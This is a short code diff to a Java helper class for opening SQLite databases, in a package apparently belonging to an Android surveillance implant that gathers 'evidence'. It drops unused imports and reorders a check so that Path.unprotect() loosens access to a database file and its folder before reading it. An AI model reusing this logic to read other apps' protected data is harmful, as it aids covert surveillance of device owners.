@@ -5,15 +5,9 @@ import java.io.IOException;
 
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteException;
-import android.database.sqlite.SQLiteOpenHelper;
 import android.database.sqlite.SQLiteQueryBuilder;
 
-import com.android.deviceinfo.Messages;
-import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
-import com.android.deviceinfo.evidence.EvidenceReference;
-import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
@@ -82,7 +76,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 
 		File fs = new File(dbFile);
 
-		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath()) && fs.canRead()) {
+		if ( Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath()) && fs.exists() && fs.canRead()) {
 			// if(Path.unprotect(fs.getParent()) &&
 			// Path.unprotect(fs.getAbsolutePath()))
 			dbFile = fs.getAbsolutePath();
